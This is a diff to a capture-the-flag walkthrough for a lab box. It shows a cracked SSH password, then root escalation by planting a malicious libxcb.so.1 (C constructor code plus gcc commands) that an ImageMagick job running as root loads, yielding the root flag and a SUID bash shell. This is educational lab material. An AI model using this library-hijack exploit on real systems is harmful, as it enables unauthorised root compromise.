@@ -202,9 +202,13 @@ hashcat -m 10900 hashes.txt --show
 sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
 ```
 
+
+
 ![image](https://github.com/user-attachments/assets/189472a7-0fbf-48ba-b5ef-b5f55e98255c)
 
-password is **``25282528``**
+> [!warning]
+> ### ssh password : **``25282528``**
+
 
 ---
 
@@ -219,6 +223,199 @@ ssh developer@10.10.11.55
 after run linpeas found 
 
 ![image](https://github.com/user-attachments/assets/97793429-cabf-44ac-8b9a-737ab837dd09)
+
+
+
+```bash
+ps aux
+```
+
+![image](https://github.com/user-attachments/assets/c3dda3e6-89a2-42d0-8df3-907682393fc5)
+
+```bash
+/usr/bin/python3 /opt/app/app.py
+```
+
+
+```bash
+cd /opt
+```
+
+![image](https://github.com/user-attachments/assets/b32380cc-d09e-4e43-8792-d979241253b7)
+
+> ### the script work as ``Root``
+
+```css
+-rwxr-xr-x 1 root root 167 Feb  3 17:11 /opt/scripts/identify_images.sh
+```
+
+now we will see content of ``identify_images.sh``
+
+```bash
+cat identify_images.sh 
+```
+
+
+```bash
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+```
+
+> #### This means that any ``.jpg`` file in this directory will be automatically processed by ``identify`` when the script runs. Given this behavior, I decided to investigate whether ``ImageMagick`` had any known vulnerabilities.
+
+
+on ``/opt/app/static/assets/images`` do :
+
+```bash
+nano exploit.c
+```
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init() {
+    system("cat /root/root.txt > /tmp/root.txt");
+    exit(0);
+}
+```
+
+
+now do compile to library :
+
+```
+gcc -x c -shared -fPIC -o libxcb.so.1 exploit.c
+```
+
+copy any image form directoy you in but with new name:
+
+```bash
+cp entertainment.jpg exploit.jpg
+```
+
+```
+ls
+```
+
+you must find ``exploit.jpg`` &  ``libxcb.so.1``
+
+![image](https://github.com/user-attachments/assets/8869a38e-ef10-432c-a74d-c13c12c8036f)
+
+now get the ``rootflag`` :
+
+```bash
+cat /tmp/root.txt
+```
+
+![image](https://github.com/user-attachments/assets/0d2931ca-cbd7-4665-a6c8-50210190c022)
+
+
+---
+---
+
+if you want to be ``root``
+
+
+```bash
+nano exploit.c
+```
+
+```c
+// exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void __attribute__((constructor)) init() {
+    system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
+}
+```
+
+do compile to library 
+
+```
+gcc -shared -fPIC -o libxcb.so.1 exploit.c
+```
+
+create new image to make script start work
+
+```
+cp entertainment.jpg exploit2.jpg
+```
+
+after script work you will find ``/tmp/rootbash`` with ``suid`` privillage
+
+```
+ls -l /tmp/rootbash
+```
+
+![image](https://github.com/user-attachments/assets/8b10cb3f-2e9f-407e-ac86-7fb5040fd2eb)
+
+
+run it :
+
+```
+/tmp/rootbash -p
+```
+
+
+![image](https://github.com/user-attachments/assets/b931b127-5b6b-46e1-9f97-ba2bb8cf0a33)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
